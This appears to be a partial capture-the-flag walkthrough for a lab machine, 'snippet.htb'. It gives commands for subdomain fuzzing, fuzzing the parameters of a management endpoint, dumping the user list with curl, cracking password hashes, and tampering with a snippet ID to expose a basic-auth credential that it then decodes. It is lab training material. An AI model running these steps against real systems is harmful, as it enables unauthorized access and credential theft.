Start with a nmap scan & fuzzing some subdomains
Subdomains found:
	mail.snippet.htb
	dev.snippet.htb

Viewing the html of the main website we found a script. Beautify it, save it and execute the following commnad.
# cat ziggy.js | grep uri

There's an endpoint "/management/dump".
Some parameters are needed to complete the POST request, so it's time to fuzz them

# wfuzz -d '{"FUZZ":"FUZZ"}' -u http://snippet.htb/management/dump -w /usr/share/wordlists/wfuzz/general/big.txt -H "Content-Type: application/json" -H "X-XSRF-TOKEN: x_xsrf_token" -H "Cookie: XSRF-TOKEN=xsrf_token; snippethtb_session=session_id" --hs "Missing"
The tokens can be obtained doing a failed logging attempt

The parameters are download & user and with that the http request can be done
# curl -d '{"download":"users"}' http://snippet.htb/management/dump -H "Content-Type: application/json" -H "X-XSRF-TOKEN: x_xsrf_token" -H "Cookie: XSRF-TOKEN=xsrf_token; snippethtb_session=session_id" > users.json

There are some users with the 'manager' type, don't waste time trying to crack them.
However some users have hashes with the same password that can be cracked. Check the hash.txt file to view them.

Log in to the main website with one of these users
There is a field that can be tampered updating the 'new snippet'. Put 2 insted of other number and to the bottom of the html code
there is a curl payload
# GET /snippets/update/2
payload:
# curl -XGET http://dev.snippet.htb/api/v1/users/jean/tokens -H 'accept: application/json' -H 'authorization: basic amVhbjpFSG1mYXIxWTdwcEE5TzVUQUlYblluSnBB'

After decoding the authorization field you will find the user and password for jean user
# echo 'amVhbjpFSG1mYXIxWTdwcEE5TzVUQUlYblluSnBB' | base64 -d
